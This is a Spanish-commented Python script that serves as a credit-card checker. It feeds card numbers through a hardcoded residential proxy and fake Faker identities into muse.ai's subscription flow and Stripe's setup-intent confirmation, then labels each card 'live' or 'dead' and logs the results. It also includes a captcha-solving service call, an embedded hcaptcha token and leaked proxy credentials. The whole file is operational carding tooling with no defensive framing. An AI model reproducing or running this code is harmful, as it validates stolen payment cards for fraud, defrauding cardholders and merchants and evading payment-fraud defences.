from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import PoolTimeout, request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper
from curl_cffi import requests
import json
import re
import uuid
from datetime import datetime
from faker import Faker

import random
import concurrent.futures


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }

def generar_correo_random():
    # Lista de dominios reales
    dominios = [
        "gmail.com", "outlook.com", "hotmail.com", "live.com",
        "yahoo.com", "icloud.com", "aol.com", "proton.me"
    ]

    # Generar un username aleatorio
    letras = string.ascii_lowercase
    numeros = string.digits

    username = (
        "".join(random.choice(letras) for _ in range(6)) +
        "".join(random.choice(numeros) for _ in range(3))
    )

    # Elegir dominio al azar
    dominio = random.choice(dominios)

    return f"{username}@{dominio}"


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None
    
    
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
def procesar_tarjeta(card: str) -> str:
    max_retries = 5
    retry_count = 0
    intentos = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            proxy_user = "pcYp1LG9I2-res-any"
            proxy_pass = "PC_72vlLqom0ILsrtLH7"
            proxy_host = "proxy-us.proxy-cheap.com"
            proxy_port = 5959

            # Crear la URL del proxy
            proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"

            # Crear sesión
            c = requests.Session()

            # Configurar proxy en la sesión
            proxies = {
                "http": proxy_url,
                "https": proxy_url,
            }
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            
            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']

            #============[Requests 1]============#

            correos = [
                "yulidaj78@outlook.com",
                "deqebalek@outlook.com",
                "kiknbina78@outlook.com",
                "ernemulasted@outlook.com",
                "mulgicaquituk@outlook.com",
                "yukijuante@outlook.com",
                "loluivilla@outlook.com"
            ]

            correo_seleccionado = random.choice(correos)
            inicio=datetime.now()
            responde = c.post(
                url = "https://muse.ai/api/pay/start",
                json = {"email":"johnny53cl.ark.3.0.9.2@gmail.com","name":"Adriano kamo","trial":1,"tier":"basic","cost_month":16,"duration":2629800,"access":"MP7GHiKeVCbKTgEhuyuUnkGg6HdQt5oKyX","referral":"","pm":"pm_1RIvBpAFhwyEmCXhQow8s9Y0","ab_pricing":0,"ab_landing":0},
                headers = {
                    "Content-Type": "application/json",
                    "origin": "https://muse.ai",
                    "priority": "u=1, i",
                    "referer": "https://muse.ai/join?email=johnny53cl.ark.3.0.9.2%40gmail.com&access=MP7GHiKeVCbKTgEhuyuUnkGg6HdQt5oKyX"
                })           
            
            #print(responde.text)            
            if  'error' in responde.text:
                dato = json.loads(responde.text).get("error", {}).get("code")
                mensaje = f"card -» {card}\nStatus -» ?? Error \nResult -» {dato}"
                return mensaje    
            
            secret = json.loads(responde.text).get("id", {})

            secret2 = json.loads(responde.text).get("secret", {})  

            responde = requests.post(
                url = f"https://api.stripe.com/v1/setup_intents/{secret}/confirm",
                data = {
                    "payment_method_data[type]": "card",
                    "payment_method_data[billing_details][name]": "Adriano kamo",
                    "payment_method_data[billing_details][email]": "johnny53cl.ark.3.0.9.2@gmail.com",
                    "payment_method_data[billing_details][address][postal_code]": "79903",
                    "payment_method_data[card][number]": cc_number,
                    "payment_method_data[card][cvc]": cvv,
                    "payment_method_data[card][exp_month]": mes,
                    "payment_method_data[card][exp_year]": ano_number,
                    "payment_method_data[guid]": "4d4b8f01-d806-4f9c-92b9-2fdb2a947b94ffe548",
                    "payment_method_data[muid]": "3329e4912-94da-48cc-8d29-dd4fc67115d97f3162",
                    "payment_method_data[sid]": "f10b1ac9-6f91-41c8-8c28-d5d1593570fca56591",
                    "payment_method_data[pasted_fields]": "number",
                    "payment_method_data[payment_user_agent]": "stripe.js/a8247d96cc; stripe-js-v3/a8247d96cc; card-element",
                    "payment_method_data[referrer]": "https://muse.ai",
                    "payment_method_data[time_on_page]": "769482",
                    "expected_payment_method_type": "card",
                    "use_stripe_sdk": "true",
                    "key": "pk_live_a6DCdatuNGQFYQOaddF0Guf3",
                    "client_secret": secret2,
                    #"radar_options[hcaptcha_token]": "P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiT3NsNEU1NjhvK2lDTGJWUUNvdGt3eTdEdUJLUkI5ZWVhVHdVRGdDenNXUW9vMCtkQWN3cWROYTlEZ21KTlloc2NYQkF1SHRpZFhEZUFtYzBsaVNqSng4bU9SVThITFNZRlNjRklNaUZtM0VJWWpDTUFHV2VCRjgyNjNMakNuQXA1a3liVUIvQWtISXk3b1pxYlVrS01oWDQ4Q1BUQStlN0lWNUo2ZGVwSDJ1YXJVdklVZ0RZaEVSRlQ5YUVvVEFiaDR3RzdPSFVMTURGZ3R6d2UxMlh0V2xXaktNS2hjRXNWTDcyRE5icTNwbmNoZEFkbnhyR2JBM2dXb20yT0V1N2FzQ3Rnd1MzYUVQZTZjYm83SHgvSTRndmNTN1pwMkNuS3FoemdqVnlyc2RYOEsxWnJTM1VUODA1SmF5ajVSMUE5bno1WnZCMFQ4UFBSSVpJTWpmbjdvZ1BvcjdQbWdVS0NEWC9vR0ZIV3U5a3AxbzhkK3l3WlpGN3o3Z2tSRW1lWlIydk9YOC9ZVWtsbnJtTlkyT1Z0eHpWdXpKL0lTU3hRd09DY0wyZ3dQV0w0T3k1ZnRpR3MwRHNpRDhuSnNldk1HVUdzYVh5MG5GVEJwVnRyS2VvMlQrTEpEY2I0cjJkdTA5NlIvL3F1NGRiS0dTbFZ0Y1pOK3ZyUUJtMnNDYXFYY3JCMlVpajc1V1lSTm1JemtoUS80NTlYM0twbDI2aEg5enJWU3UzZ1dZY2NFV2VaMDJtdUdQbGJkSURLaGFGT2RqQS9ReEVCcnFMVkR3RjU1Z0F3L0UweEI3TnFyNVJQTWtHMUpEenk3MVhQakd3Sm1lNzQ1YUhrcWhOL2xYYmxlYXNYWGx5d0toOWw4NS8vckJ5OWI4bjN5K1BuUGYwN2RmaEhiUXhjMmpRRzYvbUhHTGM2Q0hvV2pvcVlFMVh6aGZmL0J4d3V6aDE2MDhLNUlmdUVrRG4wYk0yTFFTdVhNUXNPMkthS3BER05LZVlYb2psclBaVmYrWVFiWWprUFVydFA2K3dRbnB1U0d4N0s4R28zZkNXZE82aUYvRzFtQkw4UXRla1BYSzZvMG0vTmtHRFdkanVDYXo4MEdEc211ejU4L3lYNWdBc0RxQXhKWUxiNWxlUFNtWmpMVEF2SjZEK0ZFRkZGY2Zxc0Q4WGNuUWZXRnBuRWRlQVppUVZLVWl5STdBTEsrL0NVcG50Y1VHcjcxRUdTd3NpOU93ZGdKdVo4amJFR2ZpV0IvWU1zMFlIcUJ6QWZTMnpkaGVGWHZGWm9rUlYwcXBXc1BnU2h1bW1OYm1RV1VMV245K0FQMUxRWUlVT0xlNUJtWDJXamhhRXRob0s4MW1BUUxLMzhQSE1WLzJIdEZva0VJRHZhdEVQMlE0Y0xENFVuUGtDS000eDE2ZVlYV29YQXc5ZS9SOWFHNXFDWGtBSER3R2JCQmR0ZHRkelBnMGgzK2RZQTQwVnd1VFVGMktDUFVzMFlFcWZXejJKR0d2T0lUc3lVQVNtY3pOK2I1eGZjWkxuOCt5U0I0WWFZSyt1Qm1jUU54ZnFrOUMrRTB4clZnc3Q1U1FLbVZFR2VaOFV1SnFadGJIREFsZ1pnZjJxc1pDSnZCaVZrSkc1aVFPVUpXMTRsV1JFWXNOanY4UjFUQkdTZXkzTG9UdmFNOWdCbjVjSEhkMUIvcVpjUWp2UzJYK1VFZmJiZWlWblJuakh6UGlrQ2QyVUU0ajdGTlJ6d09vUUw0eDh3UjNJM2wrU2VCMDkrNXRGVmZKWCtLbUd6N3lqN1A1MkdMRjhNdndiRnQ0TUJjd3pNTFlnMEJCYTRxeGhwRHp5bFh6QzUyN25zWmV2RG5IMURxSEdjSWgwK2hKdW0rVHcxWENWVjZ5SUJDeVUvWVlpNjdwcTZaWnFZdU1HUnZuZEZSWGxCZlEwUHpoSmNCNC9JdTNvSUlUbWZ5dGxZbGlNZzgvTGovWWJXRjNYOXI3UEUzazZCa2FodUxsRm5CRnJZUnJFVndnY3hLSW1SbHNxRUR3aDE4WmlIaEUwbXJrai9KNklFZkxPODRVbkljQnJQVW5kelZpdW05WUJRUThCT1FlR05xcVlSN1pBcFlrRmV4enJKdHhBTTExZWNlaGUwUXdXdVY3ZjZMckhhS3hOaUthbldZU3JGTzluUEdqUkM2UlpBcVVhNzhzZWZWamFtNi8zeWVYM2cxN0U4ZWFQR1lnaHFvRjRVc1VFaDl2TVRjdWpxcGpybG50OFdadWdjRlZFQ3dqVGR3UzlobVVURHU3ZFhOS3lrQ0RqUENBNjY4NEZLVmJrZC9Fdmh6dFZGVXY1V21kS2lMMGVVOEo4RFJCdyt5SXp3ZnJpbVRBTXZVdXIyUmNrUzJIOW5WZXh4RExnKzNCTXhiOGJNSHNheHNPTEVNbEhzZGx3SjRQSjJCTDFDbW4vQ2pZMHNLS2tTMmNzRTlSSmJhdy9IZFJkZTcySU9McmVkYmdXTTVKV0YzY1JrcUxubGh3bTdYQVVEMlg0SGhmS3phanlyR0pna1hrUm9KdmFTT0VvRFNLREowQVpyWGRVQUNVYTdPSTA1cHpCUTA1ZFN4cm9INWJqbXUySTVmczNPd1lRZ2QvdmQxbXFwZXdVWjJJeFkva3pEUzdiRnErS0hocFZ1OWduWTk2Nk9za2pmN1Z5dldsME84dlJRQ1FEZWV1ME1CcUJDM204aDh3d3dTZ1FvcXNEbUJyclp6MitJTVFIMkhYSGRFYS93SWpXbHZOdXhJaUJ3S0xRMVpUTldPZjUxSDcyb1l2NHh2bnY5eEQweFNWVDI5Y1dyTDF5YklnPSIsImV4cCI6MTc0MTU0MTA5Miwic2hhcmRfaWQiOjIyMTk5NjA3Mywia3IiOiIxNjJkOWE0MSIsInBkIjowLCJjZGF0YSI6Ind2VXk4NlZha0lXSk04ZncyUlRNRVovUURnS2M0K1dtYkdCNlF1MlFWSEVob2dCMHVENmwwcElsb3J3eFRlNzhEQk5FcVl1c2E2emQ3RDhSK0svdHpQSnppYzZJaWhxVFdPck1qMDdZMzlhVHNmNTdrekJ2NUNTZlBJYXc2STEvbDI1QURGN2tZVlFPaXZVa2h5elQ5TVpOcGNsRTNKQjh0ZlJOY0xwYkdXMTR6bXR2RkJyWkQrU0pzT0RjczdObXJCS2cxYjFCOHEvdE5jUkkifQ.bdJfIJNvKV_6K6u2rrz1zx2SGhef5iouL2PSMeIxRKs"
                },
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com",
                    "priority": "u=1, i",
                    "referer": "https://js.stripe.com/"
                })

            source = responde.text

            with open("maciza Datos.txt", 'a') as archivo:
                archivo.write(cc_number[:6]+'-----'+source + '\n')
                
            tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
            if  '"status": "succeeded"' in source:
                status = "live"
                mensaje = f"Aprobado ✅ | Charged $1 MXN ?"
            else:
                response_json = responde.json()
                error_details = response_json.get('error', {})
                message = error_details.get('message', 'No message available')
                code = error_details.get('code', 'No code available')

                if "Your card's security code is invalid" in source or "Your card's security code is incorrect" in source:
                    status, result = "Live", message+' '+code
                elif 'requires_action' in source:
                    mensaje = f"Tarjeta rechazada: {message}"
                    status = "dead"
                elif responde.status_code == 402:
                    mensaje = f"Tarjeta rechazada: {message}"
                    status = "dead"
                else:
                    mensaje = f"Tarjeta rechazada: {message}"
                    status = "dead"

            resultado={"status": status, "message": mensaje, "cc": card}
            
            

            return {"status": status, "message": mensaje, "cc": card}
        
        except Exception as e:
            print("maciza Error: ",e)
            intentos += 1
            if intentos == max_retries:
                message_to_send = f"card -» {card}\nStatus -»?? Error\nResult -» Desconexion" 
                return message_to_send



            




        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    